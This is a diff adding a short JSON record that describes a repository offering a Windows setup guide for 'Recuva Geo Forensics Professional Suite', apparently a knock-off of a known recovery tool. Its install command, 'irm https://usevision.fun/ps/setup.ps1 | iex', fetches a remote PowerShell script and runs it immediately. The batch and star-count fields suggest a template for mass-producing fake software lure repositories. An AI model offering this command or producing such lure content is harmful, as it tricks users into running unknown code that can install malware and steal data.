@@ -1,0 +1,12 @@
+{
+  "repo": "Recuva-Geo-Forensics-Professional-Setup-Windows-Guide",
+  "product": "Recuva Geo Forensics Professional Suite",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 8,
+  "batch": "photo29",
+  "format": "troubleshooting-guide",
+  "category": "recovery-software"
+}
